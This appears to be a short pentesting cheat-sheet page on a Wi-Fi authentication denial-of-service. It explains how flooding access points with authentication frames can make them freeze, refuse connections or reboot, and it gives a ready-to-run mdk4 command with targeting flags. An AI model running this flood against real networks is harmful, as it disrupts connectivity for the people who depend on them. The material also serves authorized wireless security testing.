# Authentication Denial-Of-Service

## Intro

Sends authentication frames to all APs found in range. Every AP has a finite number of connection requests it can handle. After reaching this number the system might:

* **Freeze**&#x20;
* **Stop accepting new connections**
* **Reboot to clean its physical memory**

```
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
